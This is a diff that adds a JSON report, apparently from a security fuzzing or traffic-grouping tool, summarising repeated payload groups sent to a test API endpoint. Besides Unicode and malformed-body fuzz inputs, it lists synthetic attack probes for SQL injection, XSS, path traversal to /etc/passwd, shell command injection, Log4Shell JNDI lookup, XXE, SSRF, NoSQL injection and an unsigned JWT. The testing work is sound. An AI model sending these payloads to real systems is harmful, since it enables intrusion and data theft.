@@ -1,0 +1,693 @@
+{
+  "at": "2026-11-14T22:55:34Z",
+  "coldMs": 2125,
+  "cachedMs": 1663,
+  "totalSessions": 35736,
+  "totalGroups": 2246,
+  "repeatedPayloadExamples": [
+    {
+      "fingerprint": "10b0203c6dc1e28afe1aa8e64025f81b",
+      "service": 18080,
+      "path": "/api/items",
+      "count": 243,
+      "anomalyCount": 0,
+      "payload": [
+        "1:http/query.q = Привет 世界 🚀 "
+      ],
+      "variableFields": [
+        "1:http/header.x-request-id",
+        "1:http/query.marker",
+        "1:http/query.page"
+      ]
+    },
+    {
+      "fingerprint": "51c0e18d6b522547438865313e7f8c8d",
+      "service": 18080,
+      "path": "/api/items",
+      "count": 240,
+      "anomalyCount": 1,
+      "payload": [
+        "1:http/query.q = Привет 世界 🚀 "
+      ],
+      "variableFields": [
+        "1:http/header.x-request-id",
+        "1:http/query.marker",
+        "1:http/query.page"
+      ]
+    },
+    {
+      "fingerprint": "6c28ed01eef590df32451a99ae1632f4",
+      "service": 18080,
+      "path": "/api/items",
+      "count": 237,
+      "anomalyCount": 2,
+      "payload": [
+        "1:http/body = \\x0\\x1\\x2\\x3\\x4\\x5\\x6\\x7\\x8\\x9\\xa\\xb\\xc\\xd\\xe\\xf\\x10\\x11\\x12\\x13\\x14\\x15\\x16\\x17…"
+      ],
+      "variableFields": [
+        "1:http/header.x-request-id",
+        "1:http/query.marker"
+      ]
+    },
+    {
+      "fingerprint": "dec51d465870fc199f254012f49e3629",
+      "service": 18080,
+      "path": "/api/items",
+      "count": 234,
+      "anomalyCount": 0,
+      "payload": [
+        "1:http/query.q = Привет 世界 🚀 "
+      ],
+      "variableFields": [
+        "1:http/header.x-request-id",
+        "1:http/query.marker",
+        "1:http/query.page"
+      ]
+    },
+    {
+      "fingerprint": "fe6ed31ae1080e6adda5ff5758a9c505",
+      "service": 18080,
+      "path": "/api/items",
+      "count": 232,
+      "anomalyCount": 0,
+      "payload": [
+        "1:http/body = {\"broken\": [1, true, null, }"
+      ],
+      "variableFields": [
+        "1:http/header.x-request-id",
+        "1:http/query.marker"
+      ]
+    },
+    {
+      "fingerprint": "08f2f10fc368e9c2d0621d1d0a409367",
+      "service": 18080,
+      "path": "/api/items",
+      "count": 227,
+      "anomalyCount": 0,
+      "payload": [
+        "1:http/query.q = Привет 世界 🚀 "
+      ],
+      "variableFields": [
+        "1:http/header.x-request-id",
+        "1:http/query.marker",
+        "1:http/query.page"
+      ]
+    },
+    {
+      "fingerprint": "49265de0e1ac471778181df84b469a54",
+      "service": 18080,
+      "path": "/api/items",
+      "count": 225,
+      "anomalyCount": 1,
+      "payload": [
+        "1:http/query.q = Привет 世界 🚀 "
+      ],
+      "variableFields": [
+        "1:http/header.x-request-id",
+        "1:http/query.marker",
+        "1:http/query.page"
+      ]
+    },
+    {
+      "fingerprint": "c4554002645397ad3bd74a3296dbfdce",
+      "service": 18080,
+      "path": "/api/items",
+      "count": 220,
+      "anomalyCount": 0,
+      "payload": [
+        "1:http/query.q = Привет 世界 🚀 "
+      ],
+      "variableFields": [
+        "1:http/header.x-request-id",
+        "1:http/query.marker",
+        "1:http/query.page"
+      ]
+    },
+    {
+      "fingerprint": "8c3047dbd942b522aeeedf0a479e4c8c",
+      "service": 18080,
+      "path": "/api/items",
+      "count": 219,
+      "anomalyCount": 2,
+      "payload": [
+        "1:http/query.q = Привет 世界 🚀 "
+      ],
+      "variableFields": [
+        "1:http/header.x-request-id",
+        "1:http/query.marker",
+        "1:http/query.page"
+      ]
+    },
+    {
+      "fingerprint": "f1ce9bd19cccb4dde8e05271221c9449",
+      "service": 18080,
+      "path": "/api/items",
+      "count": 213,
+      "anomalyCount": 1,
+      "payload": [
+        "1:http/body = \\x0\\x1\\x2\\x3\\x4\\x5\\x6\\x7\\x8\\x9\\xa\\xb\\xc\\xd\\xe\\xf\\x10\\x11\\x12\\x13\\x14\\x15\\x16\\x17…"
+      ],
+      "variableFields": [
+        "1:http/header.x-request-id",
+        "1:http/query.marker"
+      ]
+    },
+    {
+      "fingerprint": "9015d0eba543033c677291b022ddcd50",
+      "service": 18080,
+      "path": "/api/items",
+      "count": 208,
+      "anomalyCount": 2,
+      "payload": [
+        "1:http/query.q = Привет 世界 🚀 "
+      ],
+      "variableFields": [
+        "1:http/header.x-request-id",
+        "1:http/query.marker",
+        "1:http/query.page"
+      ]
+    },
+    {
+      "fingerprint": "a8e11687452e292ba9bf25a4244b8b73",
+      "service": 18080,
+      "path": "/api/items",
+      "count": 205,
+      "anomalyCount": 0,
+      "payload": [
+        "1:http/body = {\"broken\": [1, true, null, }"
+      ],
+      "variableFields": [
+        "1:http/header.x-request-id",
+        "1:http/query.marker"
+      ]
+    },
+    {
+      "fingerprint": "59041dd28a38ae2496c3c30ad2e48c35",
+      "service": 18080,
+      "path": "/api/items",
+      "count": 200,
+      "anomalyCount": 4,
+      "payload": [
+        "1:http/body = \\x0\\x1\\x2\\x3\\x4\\x5\\x6\\x7\\x8\\x9\\xa\\xb\\xc\\xd\\xe\\xf\\x10\\x11\\x12\\x13\\x14\\x15\\x16\\x17…"
+      ],
+      "variableFields": [
+        "1:http/header.x-request-id",
+        "1:http/query.marker"
+      ]
+    },
+    {
+      "fingerprint": "f0f2c1011ff1f3b1960fc9a392c9a174",
+      "service": 18080,
+      "path": "/api/items",
+      "count": 200,
+      "anomalyCount": 0,
+      "payload": [
+        "1:http/body = {\"broken\": [1, true, null, }"
+      ],
+      "variableFields": [
+        "1:http/header.x-request-id",
+        "1:http/query.marker"
+      ]
+    },
+    {
+      "fingerprint": "9fac3b1b361cd252c4dd7c1c2ac18bc2",
+      "service": 18080,
+      "path": "/api/items",
+      "count": 199,
+      "anomalyCount": 0,
+      "payload": [
+        "1:http/body = {\"broken\": [1, true, null, }"
+      ],
+      "variableFields": [
+        "1:http/header.x-request-id",
+        "1:http/query.marker"
+      ]
+    },
+    {
+      "fingerprint": "6b443b17df14ed037d7ee698be1c6a90",
+      "service": 18080,
+      "path": "/api/items",
+      "count": 185,
+      "anomalyCount": 3,
+      "payload": [
+        "1:http/body = \\x0\\x1\\x2\\x3\\x4\\x5\\x6\\x7\\x8\\x9\\xa\\xb\\xc\\xd\\xe\\xf\\x10\\x11\\x12\\x13\\x14\\x15\\x16\\x17…"
+      ],
+      "variableFields": [
+        "1:http/header.x-request-id",
+        "1:http/query.marker"
+      ]
+    },
+    {
+      "fingerprint": "15ca1f778d0abcbffc54a51b86c173be",
+      "service": 18080,
+      "path": "/api/items",
+      "count": 61,
+      "anomalyCount": 8,
+      "payload": [
+        "1:http/query.q = {{7*7}}${7*7}<%=7*7%>"
+      ],
+      "variableFields": [
+        "1:http/header.x-request-id",
+        "1:http/query.marker"
+      ]
+    },
+    {
+      "fingerprint": "696de7685f52a6bd86ab2d227141aa26",
+      "service": 18080,
+      "path": "/api/items",
+      "count": 56,
+      "anomalyCount": 6,
+      "payload": [
+        "1:http/query.q = {{7*7}}${7*7}<%=7*7%>"
+      ],
+      "variableFields": [
+        "1:http/header.x-request-id",
+        "1:http/query.marker"
+      ]
+    },
+    {
+      "fingerprint": "41661bfd318452112a1771caedc7e8d8",
+      "service": 18080,
+      "path": "/api/items",
+      "count": 56,
+      "anomalyCount": 12,
+      "payload": [
+        "1:http/query.q = {\"user\":\"synthetic\",\"role\":\"admin\",\"is_admin\":true}"
+      ],
+      "variableFields": [
+        "1:http/header.x-request-id",
+        "1:http/query.marker"
+      ]
+    },
+    {
+      "fingerprint": "e4c40df9283f78065cdeae759aa3998f",
+      "service": 18080,
+      "path": "/api/items",
+      "count": 54,
+      "anomalyCount": 15,
+      "payload": [
+        "1:http/query.q = ${jndi:ldap://probe.invalid/synthetic}"
+      ],
+      "variableFields": [
+        "1:http/header.x-request-id",
+        "1:http/query.marker"
+      ]
+    },
+    {
+      "fingerprint": "d788e9745d5ffd343d3dc8385d3de5d4",
+      "service": 18080,
+      "path": "/api/items",
+      "count": 53,
+      "anomalyCount": 8,
+      "payload": [
+        "1:http/body = ; echo SYNTHETIC_PROBE; #",
+        "1:http/query.q = ; echo SYNTHETIC_PROBE; #"
+      ],
+      "variableFields": [
+        "1:http/header.x-request-id",
+        "1:http/query.marker"
+      ]
+    },
+    {
+      "fingerprint": "60b2ebb977591190237b18ed3abe8eba",
+      "service": 18080,
+      "path": "/api/items",
+      "count": 53,
+      "anomalyCount": 2,
+      "payload": [
+        "1:http/query.q = hello"
+      ],
+      "variableFields": [
+        "1:http/header.x-request-id",
+        "1:http/query.marker"
+      ]
+    },
+    {
+      "fingerprint": "211e02283932e1b24407e91d1f804d61",
+      "service": 18080,
+      "path": "/api/items",
+      "count": 53,
+      "anomalyCount": 3,
+      "payload": [
+        "1:http/query.q = {{7*7}}${7*7}<%=7*7%>"
+      ],
+      "variableFields": [
+        "1:http/header.x-request-id",
+        "1:http/query.marker"
+      ]
+    },
+    {
+      "fingerprint": "8b696c87bd923658ea4dcb0d8f47d370",
+      "service": 18080,
+      "path": "/api/items",
+      "count": 53,
+      "anomalyCount": 6,
+      "payload": [
+        "1:http/query.q = ../../../../etc/passwd"
+      ],
+      "variableFields": [
+        "1:http/header.x-request-id",
+        "1:http/query.marker"
+      ]
+    },
+    {
+      "fingerprint": "6cc04838e4cdffb0f42359c8bc34eb1f",
+      "service": 18080,
+      "path": "/api/items",
+      "count": 51,
+      "anomalyCount": 5,
+      "payload": [
+        "1:http/body = ; echo SYNTHETIC_PROBE; #",
+        "1:http/query.q = ; echo SYNTHETIC_PROBE; #"
+      ],
+      "variableFields": [
+        "1:http/header.x-request-id",
+        "1:http/query.marker"
+      ]
+    },
+    {
+      "fingerprint": "a69c53e649675e36b3bf11ead9b0878d",
+      "service": 18080,
+      "path": "/api/items",
+      "count": 51,
+      "anomalyCount": 0,
+      "payload": [
+        "1:http/query.q = http://127.0.0.1:9/synthetic-probe"
+      ],
+      "variableFields": [
+        "1:http/header.x-request-id",
+        "1:http/query.marker"
+      ]
+    },
+    {
+      "fingerprint": "f7ec085f086c18a739581f0857bf16f3",
+      "service": 18080,
+      "path": "/api/items",
+      "count": 49,
+      "anomalyCount": 7,
+      "payload": [
+        "1:http/query.q = {\"username\":{\"$ne\":null},\"password\":{\"$ne\":null}}"
+      ],
+      "variableFields": [
+        "1:http/header.x-request-id",
+        "1:http/query.marker"
+      ]
+    },
+    {
+      "fingerprint": "52ca3535ac40d7bc430dbbd7545ab238",
+      "service": 18080,
+      "path": "/api/items",
+      "count": 49,
+      "anomalyCount": 0,
+      "payload": [
+        "1:http/query.q = http://127.0.0.1:9/synthetic-probe"
+      ],
+      "variableFields": [
+        "1:http/header.x-request-id",
+        "1:http/query.marker"
+      ]
+    },
+    {
+      "fingerprint": "90a084d1c0f9a0537006bf997164c6f4",
+      "service": 18080,
+      "path": "/api/items",
+      "count": 49,
+      "anomalyCount": 10,
+      "payload": [
+        "1:http/query.q = ${jndi:ldap://probe.invalid/synthetic}"
+      ],
+      "variableFields": [
+        "1:http/header.x-request-id",
+        "1:http/query.marker"
+      ]
+    },
+    {
+      "fingerprint": "27358d92eb192efafde538b1118d539f",
+      "service": 18080,
+      "path": "/api/items",
+      "count": 49,
+      "anomalyCount": 5,
+      "payload": [
+        "1:http/query.q = http://127.0.0.1:9/synthetic-probe"
+      ],
+      "variableFields": [
+        "1:http/header.x-request-id",
+        "1:http/query.marker"
+      ]
+    },
+    {
+      "fingerprint": "a0c34bfda83b081d38df5496062802ad",
+      "service": 18080,
+      "path": "/api/items",
+      "count": 49,
+      "anomalyCount": 8,
+      "payload": [
+        "1:http/query.q = eyJhbGciOiJub25lIn0.eyJzdWIiOiJzeW50aGV0aWMiLCJyb2xlIjoiYWRtaW4ifQ."
+      ],
+      "variableFields": [
+        "1:http/header.x-request-id",
+        "1:http/query.marker"
+      ]
+    },
+    {
+      "fingerprint": "8fabc88dd4865291f8c95aaaddc869d9",
+      "service": 18080,
+      "path": "/api/items",
+      "count": 49,
+      "anomalyCount": 10,
+      "payload": [
+        "1:http/query.q = {\"username\":{\"$ne\":null},\"password\":{\"$ne\":null}}"
+      ],
+      "variableFields": [
+        "1:http/header.x-request-id",
+        "1:http/query.marker"
+      ]
+    },
+    {
+      "fingerprint": "996392896650a3cfba1ad4d2929f9df2",
+      "service": 18080,
+      "path": "/api/items",
+      "count": 49,
+      "anomalyCount": 9,
+      "payload": [
+        "1:http/query.q = {\"user\":\"synthetic\",\"role\":\"admin\",\"is_admin\":true}"
+      ],
+      "variableFields": [
+        "1:http/header.x-request-id",
+        "1:http/query.marker"
+      ]
+    },
+    {
+      "fingerprint": "77b45a0b491ae04c4e2328b494d84f7e",
+      "service": 18080,
+      "path": "/api/items",
+      "count": 48,
+      "anomalyCount": 8,
+      "payload": [
+        "1:http/query.q = eyJhbGciOiJub25lIn0.eyJzdWIiOiJzeW50aGV0aWMiLCJyb2xlIjoiYWRtaW4ifQ."
+      ],
+      "variableFields": [
+        "1:http/header.x-request-id",
+        "1:http/query.marker"
+      ]
+    },
+    {
+      "fingerprint": "b77020b0f07b41220631b804cad7375d",
+      "service": 18080,
+      "path": "/api/items",
+      "count": 48,
+      "anomalyCount": 10,
+      "payload": [
+        "1:http/body = <!DOCTYPE x [<!ENTITY probe SYSTEM \"file:///synthetic-does-not-exist\">]><x>&prob…",
+        "1:http/query.q = <!DOCTYPE x [<!ENTITY probe SYSTEM \"file:///synthetic-does-not-exist\">]><x>"
+      ],
+      "variableFields": [
+        "1:http/header.x-request-id",
+        "1:http/query.marker"
+      ]
+    },
+    {
+      "fingerprint": "f4825bee275275211caf17fffcef4d95",
+      "service": 18080,
+      "path": "/api/items",
+      "count": 48,
+      "anomalyCount": 2,
+      "payload": [
+        "1:http/query.q = %2e%2e%2fsynthetic-secret"
+      ],
+      "variableFields": [
+        "1:http/header.x-request-id",
+        "1:http/query.marker"
+      ]
+    },
+    {
+      "fingerprint": "bf791f859a01023f7974d93caf6284f3",
+      "service": 18080,
+      "path": "/api/items",
+      "count": 47,
+      "anomalyCount": 1,
+      "payload": [
+        "1:http/query.q = %2e%2e%2fsynthetic-secret"
+      ],
+      "variableFields": [
+        "1:http/header.x-request-id",
+        "1:http/query.marker"
+      ]
+    },
+    {
+      "fingerprint": "30d439d50975bdedb5201ec10a35a3ae",
+      "service": 18080,
+      "path": "/api/items",
+      "count": 46,
+      "anomalyCount": 2,
+      "payload": [
+        "1:http/query.q = admin' OR '1'='1' --"
+      ],
+      "variableFields": [
+        "1:http/header.x-request-id",
+        "1:http/query.marker"
+      ]
+    },
+    {
+      "fingerprint": "4e92745c7f28b4784cc537089fe95224",
+      "service": 18080,
+      "path": "/api/items",
+      "count": 46,
+      "anomalyCount": 5,
+      "payload": [
+        "1:http/query.q = <img src=x onerror=alert(\"synthetic\")>"
+      ],
+      "variableFields": [
+        "1:http/header.x-request-id",
+        "1:http/query.marker"
+      ]
+    },
+    {
+      "fingerprint": "456378c855f0543aaa26cc2377c409f3",
+      "service": 18080,
+      "path": "/api/items",
+      "count": 46,
+      "anomalyCount": 11,
+      "payload": [
+        "1:http/query.q = {\"user\":\"synthetic\",\"role\":\"admin\",\"is_admin\":true}"
+      ],
+      "variableFields": [
+        "1:http/header.x-request-id",
+        "1:http/query.marker"
+      ]
+    },
+    {
+      "fingerprint": "5021aaf4d5b20a974595ce3875085b5c",
+      "service": 18080,
+      "path": "/api/items",
+      "count": 46,
+      "anomalyCount": 4,
+      "payload": [
+        "1:http/query.q = ../../../../etc/passwd"
+      ],
+      "variableFields": [
+        "1:http/header.x-request-id",
+        "1:http/query.marker"
+      ]
+    },
+    {
+      "fingerprint": "ccffc82907abb9691a76c280255495bc",
+      "service": 18080,
+      "path": "/api/items",
+      "count": 46,
+      "anomalyCount": 7,
+      "payload": [
+        "1:http/body = ; echo SYNTHETIC_PROBE; #",
+        "1:http/query.q = ; echo SYNTHETIC_PROBE; #"
+      ],
+      "variableFields": [
+        "1:http/header.x-request-id",
+        "1:http/query.marker"
+      ]
+    },
+    {
+      "fingerprint": "9d28317e0986d8397a93dab454a90e24",
+      "service": 18080,
+      "path": "/api/items",
+      "count": 45,
+      "anomalyCount": 10,
+      "payload": [
+        "1:http/query.q = <img src=x onerror=alert(\"synthetic\")>"
+      ],
+      "variableFields": [
+        "1:http/header.x-request-id",
+        "1:http/query.marker"
+      ]
+    },
+    {
+      "fingerprint": "dba30ff24128255c0aa476f6a76a95ee",
+      "service": 18080,
+      "path": "/api/items",
+      "count": 45,
+      "anomalyCount": 9,
+      "payload": [
+        "1:http/query.q = admin' OR '1'='1' --"
+      ],
+      "variableFields": [
+        "1:http/header.x-request-id",
+        "1:http/query.marker"
+      ]
+    },
+    {
+      "fingerprint": "6e2b092c8dfd301ff5dfeab50d57ed96",
+      "service": 18080,
+      "path": "/api/items",
+      "count": 45,
+      "anomalyCount": 4,
+      "payload": [
+        "1:http/query.q = {{7*7}}${7*7}<%=7*7%>"
+      ],
+      "variableFields": [
+        "1:http/header.x-request-id",
+        "1:http/query.marker"
+      ]
+    },
+    {
+      "fingerprint": "6853cb80ce0098609f3d5e193d8188ba",
+      "service": 18080,
+      "path": "/api/items",
+      "count": 45,
+      "anomalyCount": 4,
+      "payload": [
+        "1:http/query.q = <img src=x onerror=alert(\"synthetic\")>"
+      ],
+      "variableFields": [
+        "1:http/header.x-request-id",
+        "1:http/query.marker"
+      ]
+    },
+    {
+      "fingerprint": "304693938730505cfe85febd641cc5a8",
+      "service": 18080,
+      "path": "/api/items",
+      "count": 45,
+      "anomalyCount": 6,
+      "payload": [
+        "1:http/query.q = admin' OR '1'='1' --"
+      ],
+      "variableFields": [
+        "1:http/header.x-request-id",
+        "1:http/query.marker"
+      ]
+    },
+    {
+      "fingerprint": "310f35ad3aa55fa4a104a1f9c1aee676",
+      "service": 18080,
+      "path": "/api/items",
+      "count": 43,
+      "anomalyCount": 2,
+      "payload": [
+        "1:http/query.q = http://127.0.0.1:9/synthetic-probe"
+      ],
+      "variableFields": [
+        "1:http/header.x-request-id",
+        "1:http/query.marker"
+      ]
+    }
+  ]
+}
